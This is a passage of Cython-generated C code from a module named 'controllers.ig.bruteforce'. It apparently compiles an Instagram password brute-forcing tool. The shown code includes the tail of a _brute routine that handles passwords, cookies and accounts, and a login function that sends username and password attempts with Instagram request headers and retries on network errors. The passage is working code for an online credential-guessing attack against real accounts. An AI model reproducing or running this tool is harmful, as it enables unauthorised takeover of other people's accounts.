            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_12 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 289, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L6_exception_handled;
      }
      __pyx_L7_except_error:;

       
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
      goto __pyx_L1_error;
      __pyx_L10_try_break:;
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
      goto __pyx_L4_break;
      __pyx_L11_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
      goto __pyx_L3_continue;
      __pyx_L6_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
      __pyx_L12_try_end:;
    }

     
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_PROGRESS_CURRENT); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 291, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_13 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 291, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_PROGRESS_CURRENT, __pyx_t_13) < 0) __PYX_ERR(0, 291, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

   
  __pyx_t_2 = __Pyx_PyDict_GetItem(__pyx_v_kwargs, __pyx_n_u_progress); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 292, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_advance); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 292, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_GetItem(__pyx_v_kwargs, __pyx_n_u_task); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 292, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_14 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
    __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_11);
    if (likely(__pyx_t_14)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
      __Pyx_INCREF(__pyx_t_14);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_11, function);
    }
  }
  __pyx_t_13 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_14, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 292, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

   

   
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base._brute", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_rich);
  __Pyx_XDECREF(__pyx_v_password);
  __Pyx_XDECREF(__pyx_v_login);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XDECREF(__pyx_v_profile);
  __Pyx_XDECREF(__pyx_v_root);
  __Pyx_XDECREF(__pyx_v_account);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init_____defaults__(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__defaults__", 0);
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(((PyObject *)__pyx_int_1));
  __Pyx_GIVEREF(((PyObject *)__pyx_int_1));
  PyTuple_SET_ITEM(__pyx_t_1, 0, ((PyObject *)__pyx_int_1));
  __Pyx_INCREF(__Pyx_CyFunction_Defaults(__pyx_defaults, __pyx_self)->__pyx_arg_user_agent);
  __Pyx_GIVEREF(__Pyx_CyFunction_Defaults(__pyx_defaults, __pyx_self)->__pyx_arg_user_agent);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __Pyx_CyFunction_Defaults(__pyx_defaults, __pyx_self)->__pyx_arg_user_agent);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
  __Pyx_INCREF(Py_None);
  __Pyx_GIVEREF(Py_None);
  PyTuple_SET_ITEM(__pyx_t_2, 1, Py_None);
  __pyx_t_1 = 0;
  __pyx_r = __pyx_t_2;
  __pyx_t_2 = 0;
  goto __pyx_L0;

   
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.__defaults__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_11login(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_11login = {"login", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_11login, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_11login(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_username = 0;
  PyObject *__pyx_v_password = 0;
  PyObject *__pyx_v_retries = 0;
  PyObject *__pyx_v_user_agent = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("login (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_username,&__pyx_n_s_password,&__pyx_n_s_retries,&__pyx_n_s_user_agent,0};
    PyObject* values[5] = {0,0,0,0,0};
    __pyx_defaults *__pyx_dynamic_args = __Pyx_CyFunction_Defaults(__pyx_defaults, __pyx_self);
    values[3] = ((PyObject *)((PyObject *)__pyx_int_1));
    values[4] = __pyx_dynamic_args->__pyx_arg_user_agent;
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  5: values[4] = PyTuple_GET_ITEM(__pyx_args, 4);
        CYTHON_FALLTHROUGH;
        case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        CYTHON_FALLTHROUGH;
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_username)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("login", 0, 3, 5, 1); __PYX_ERR(0, 294, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_password)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("login", 0, 3, 5, 2); __PYX_ERR(0, 294, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  3:
        if (kw_args > 0) {
          PyObject* value = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_retries);
          if (value) { values[3] = value; kw_args--; }
        }
        CYTHON_FALLTHROUGH;
        case  4:
        if (kw_args > 0) {
          PyObject* value = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user_agent);
          if (value) { values[4] = value; kw_args--; }
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "login") < 0)) __PYX_ERR(0, 294, __pyx_L3_error)
      }
    } else {
      switch (PyTuple_GET_SIZE(__pyx_args)) {
        case  5: values[4] = PyTuple_GET_ITEM(__pyx_args, 4);
        CYTHON_FALLTHROUGH;
        case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        CYTHON_FALLTHROUGH;
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        break;
        default: goto __pyx_L5_argtuple_error;
      }
    }
    __pyx_v_self = values[0];
    __pyx_v_username = values[1];
    __pyx_v_password = values[2];
    __pyx_v_retries = values[3];
    __pyx_v_user_agent = values[4];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("login", 0, 3, 5, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 294, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_10login(__pyx_self, __pyx_v_self, __pyx_v_username, __pyx_v_password, __pyx_v_retries, __pyx_v_user_agent);

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_10login(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_username, PyObject *__pyx_v_password, PyObject *__pyx_v_retries, PyObject *__pyx_v_user_agent) {
  PyObject *__pyx_v_results = NULL;
  PyObject *__pyx_v_http = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_payload = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  Py_ssize_t __pyx_t_14;
  Py_UCS4 __pyx_t_15;
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("login", 0);

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 301, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_status, Py_None) < 0) __PYX_ERR(0, 301, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_cookie, Py_None) < 0) __PYX_ERR(0, 301, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_username, __pyx_v_username) < 0) __PYX_ERR(0, 301, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_password, __pyx_v_password) < 0) __PYX_ERR(0, 301, __pyx_L1_error)
  __pyx_v_results = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

   
  __pyx_t_1 = PyObject_RichCompare(__pyx_v_retries, __pyx_int_5, Py_GE); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 302, __pyx_L1_error)
  __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 302, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_2) {

     
    __Pyx_XDECREF(__pyx_r);
    __Pyx_INCREF(__pyx_v_results);
    __pyx_r = __pyx_v_results;
    goto __pyx_L0;

     
  }

   
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Http); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_app); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_IG_REQUEST_HEADERS); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_headers, __pyx_t_5) < 0) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_http = __pyx_t_5;
  __pyx_t_5 = 0;

   
  while (1) {

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
        {

         
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 308, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ig); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 308, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_shared_url); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 308, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_4, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_9);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 308, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_json); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 308, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 308, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_5);
        __pyx_t_5 = 0;

         
        goto __pyx_L11_try_break;

         
      }
      __pyx_L6_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

       
      __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_1, &__pyx_t_3);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 311, __pyx_L8_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ChunkedEncodingError); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L8_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Timeout); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 311, __pyx_L8_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_11 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_9) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_4) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_ErrRestore(__pyx_t_5, __pyx_t_1, __pyx_t_3);
      __pyx_t_5 = 0; __pyx_t_1 = 0; __pyx_t_3 = 0;
      if (__pyx_t_11) {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 311, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_5);

         
        goto __pyx_L15_except_continue;
        __pyx_L15_except_continue:;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        goto __pyx_L12_try_continue;
      }

       
        {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 313, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_3);

         
        __Pyx_XDECREF(__pyx_r);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 314, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyInt_AddObjC(__pyx_v_retries, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 314, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_12 = NULL;
        __pyx_t_11 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_11 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_4)) {
          PyObject *__pyx_temp[5] = {__pyx_t_12, __pyx_v_username, __pyx_v_password, __pyx_t_9, __pyx_v_user_agent};
          __pyx_t_10 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_11, 4+__pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 314, __pyx_L8_except_error)
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
          PyObject *__pyx_temp[5] = {__pyx_t_12, __pyx_v_username, __pyx_v_password, __pyx_t_9, __pyx_v_user_agent};
          __pyx_t_10 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_11, 4+__pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 314, __pyx_L8_except_error)
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        } else
        #endif
        {
          __pyx_t_13 = PyTuple_New(4+__pyx_t_11); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 314, __pyx_L8_except_error)
          __Pyx_GOTREF(__pyx_t_13);
          if (__pyx_t_12) {
            __Pyx_GIVEREF(__pyx_t_12); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_12); __pyx_t_12 = NULL;
          }
          __Pyx_INCREF(__pyx_v_username);
          __Pyx_GIVEREF(__pyx_v_username);
          PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_11, __pyx_v_username);
          __Pyx_INCREF(__pyx_v_password);
          __Pyx_GIVEREF(__pyx_v_password);
          PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_11, __pyx_v_password);
          __Pyx_GIVEREF(__pyx_t_9);
          PyTuple_SET_ITEM(__pyx_t_13, 2+__pyx_t_11, __pyx_t_9);
          __Pyx_INCREF(__pyx_v_user_agent);
          __Pyx_GIVEREF(__pyx_v_user_agent);
          PyTuple_SET_ITEM(__pyx_t_13, 3+__pyx_t_11, __pyx_v_user_agent);
          __pyx_t_9 = 0;
          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_13, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 314, __pyx_L8_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_r = __pyx_t_10;
        __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        goto __pyx_L9_except_return;
      }
      __pyx_L8_except_error:;

       
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L1_error;
      __pyx_L11_try_break:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L5_break;
      __pyx_L12_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L4_continue;
      __pyx_L9_except_return:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L0;
    }
    __pyx_L4_continue:;
  }
  __pyx_L5_break:;

   
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_headers); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 324, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
